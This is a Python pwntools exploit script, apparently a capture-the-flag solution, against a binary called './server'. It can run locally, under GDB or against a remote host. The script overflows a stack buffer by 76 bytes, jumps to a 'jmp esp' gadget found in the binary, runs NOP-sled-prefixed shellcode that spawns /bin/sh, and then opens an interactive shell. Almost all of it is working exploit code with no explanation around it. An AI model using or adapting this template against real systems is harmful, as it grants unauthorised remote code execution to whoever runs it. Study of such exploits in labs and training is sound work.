from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './server'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()
overflowtoRet = 76

# Assemble jmp esp
jmp_esp = asm('jmp esp')
jmp_esp = next(elf.search(jmp_esp))

# Assemble shellcode
shell = asm(shellcraft.sh())

# Assemble payload
payload = flat(asm('nop') * overflowtoRet, jmp_esp, asm('nop') * 16, shell)

io.sendlineafter(b':', payload)
io.interactive()